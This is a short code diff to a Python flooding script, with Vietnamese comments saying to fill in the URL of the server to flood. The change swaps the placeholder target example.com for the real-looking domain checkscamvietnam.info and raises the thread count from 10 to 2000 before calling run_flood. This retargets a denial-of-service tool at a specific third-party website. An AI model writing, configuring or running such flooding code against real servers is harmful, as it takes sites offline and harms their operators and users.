@@ -22,7 +22,7 @@ def run_flood(url, num_threads):
         thread.join()
 
 if __name__ == "__main__":
-    url = "http://example.com" # Điền địa chỉ URL của server cần flood
-    num_threads = 10 # Số lượng thread để gửi yêu cầu flood
+    url = "http://checkscamvietnam.info/" # Điền địa chỉ URL của server cần flood
+    num_threads = 2000 # Số lượng thread để gửi yêu cầu flood
    
     run_flood(url, num_threads)
